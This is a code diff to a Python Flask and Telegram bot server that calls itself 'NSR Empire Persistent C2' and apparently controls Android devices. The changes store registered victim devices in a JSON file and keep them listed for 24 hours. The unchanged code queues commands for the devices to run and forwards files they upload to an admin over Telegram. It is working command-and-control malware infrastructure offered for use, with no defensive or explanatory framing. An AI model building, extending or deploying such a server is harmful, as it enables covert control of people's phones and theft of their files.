@@ -2,6 +2,7 @@ import os
 import logging
 import threading
 import time
+import json
 from flask import Flask, request, jsonify
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -16,19 +17,34 @@ ADMIN_ID = os.environ.get('ADMIN_ID', '')
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None
 
-# تخزين متطور للأجهزة مع تتبع آخر ظهور (Timestamp)
-connected_devices = {}
+# ملف تخزين محلي لضمان عدم فقدان الأجهزة عند إعادة تشغيل السيرفر
+DB_FILE = "devices_db.json"
 pending_commands = {}
+
+def load_db():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_db(data):
+    try:
+        with open(DB_FILE, "w") as f:
+            json.dump(data, f)
+    except Exception as e:
+        logger.error(f"DB Save error: {e}")
 
 @app.route('/')
 def index():
     return jsonify({
         "status": "online",
-        "system": "NSR Empire Pro C2 Server",
+        "system": "NSR Empire Persistent C2",
         "version": "7.11"
     }), 200
 
-# نقطة الاتصال وتثبيت الجهاز في القائمة النشطة
 @app.route('/api/v1/stream', methods=['POST', 'GET'])
 @app.route('/api/connect', methods=['POST'])
 def agent_connect():
@@ -36,12 +52,14 @@ def agent_connect():
         data = request.json if request.is_json else request.form.to_dict()
         device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
         
-        is_new_device = device_id not in connected_devices
-        # تحديث وقت آخر اتصال للجهاز لضمان بقائه في القائمة النشطة
-        connected_devices[device_id] = {
+        db = load_db()
+        is_new_device = device_id not in db
+        
+        db[device_id] = {
             "data": data or {"status": "connected"},
             "last_seen": time.time()
         }
+        save_db(db)
         
         if is_new_device and bot and ADMIN_ID:
             markup = InlineKeyboardMarkup()
@@ -64,7 +82,6 @@ def agent_connect():
                 reply_markup=markup
             )
         
-        # سحب الأمر المعلق وإرساله للعميل
         command_to_execute = pending_commands.pop(device_id, "wait")
         return jsonify({"status": "success", "command": command_to_execute}), 200
     except Exception as e:
@@ -114,6 +131,7 @@ def agent_upload():
                 bot.send_document(ADMIN_ID, (filename, file_bytes))
         return jsonify({"status": "uploaded"}), 200
     except Exception as e:
+        logger.error(f"Upload error: {e}")
         return jsonify({"error": str(e)}), 500
 
 if bot:
@@ -121,19 +139,20 @@ if bot:
     def send_welcome(message):
         if str(message.from_user.id) != str(ADMIN_ID):
             return
-        bot.reply_to(message, "👑 <b>لوحة تحكم إمبراطورية NSR C2 الفعالة</b>\n\nاستخدم الأمر /devices لعرض الأجهزة المتصلة وتحكم بها عبر الأزرار المباشرة.")
+        bot.reply_to(message, "👑 <b>لوحة تحكم إمبراطورية NSR C2 الفعالة والمستقرة</b>\n\nاستخدم الأمر /devices لعرض الأجهزة المتصلة وتحكم بها عبر الأزرار المباشرة.")
 
     @bot.message_handler(commands=['devices'])
     def list_devices(message):
         if str(message.from_user.id) != str(ADMIN_ID):
             return
             
-        # تنظيف الأجهزة التي انقطع اتصالها لأكثر من 5 دقائق
+        db = load_db()
         current_time = time.time()
-        active_devs = {k: v for k, v in connected_devices.items() if current_time - v['last_seen'] < 300}
+        # بقاء الجهاز نشطاً في القائمة لمدة 24 ساعة منذ آخر اتصال
+        active_devs = {k: v for k, v in db.items() if current_time - v['last_seen'] < 86400}
         
         if not active_devs:
-            bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة حالياً في الذاكرة المؤقتة.")
+            bot.reply_to(message, "⚠️ لا توجد أجهزة مسجلة في قاعدة البيانات حالياً.")
             return
             
         for dev_id in active_devs.keys():
